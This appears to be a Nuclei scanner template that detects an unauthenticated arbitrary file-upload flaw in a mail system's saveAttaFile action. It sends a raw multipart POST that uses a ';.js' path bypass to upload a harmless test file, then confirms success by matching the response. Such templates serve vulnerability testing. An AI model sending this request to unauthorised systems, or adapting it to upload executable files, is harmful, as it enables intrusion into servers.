id: zjuedu-saveAttaFile-upload
info:
  name: zjuedu-saveAttaFile-upload
  author: apple
  severity: critical
  description: description
  reference:
    - https://mp.weixin.qq.com/s/VT5LIUiyPJ6DnMAUxXwXTg
  tags: zjedu
http:
  - raw:
      - |-
        POST /entsoft/MailAction.entphone;.js?act=saveAttaFile HTTP/1.1
        Host: {{Hostname}}
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye8FPHsIAq9JN8j2A
        Content-Length: 179

        ------WebKitFormBoundarye8FPHsIAq9JN8j2A
        Content-Disposition: form-data; name="file";filename="beautif.js"
        Content-Type: xxx/txt

        123456
        ------WebKitFormBoundarye8FPHsIAq9JN8j2A--
    matchers:
      - type: word
        part: body
        words:
          - '/enterdoc/EnterMail'
